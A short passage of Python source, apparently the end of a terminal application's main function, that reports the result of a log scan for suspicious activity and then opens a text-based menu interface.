    suspicious = analyzer.scan_for_suspicious_activity(LOG_FILE)
    
    if suspicious:
        print(f"{C_RED}  ⚠ Found {len(suspicious)} suspicious event(s){C_END}")
    else:
        print(f"{C_GREEN}  ✓ No suspicious activity detected{C_END}")
    print()
    time.sleep(0.5)
    
    # Display ready message
    print(f"{C_GREEN}{C_BOLD}INITIALIZATION COMPLETE - SYSTEM READY{C_END}")
    print(f"{C_GRAY}Press ENTER to continue...{C_END}")
    input()
    
    # Start main application
    tui = AdvancedTUI(db)
    try:
        tui.main_menu()
    except KeyboardInterrupt:
        print(f"\n{C_RED}SHUTDOWN.{C_END}")


if __name__ == "__main__":
    main()
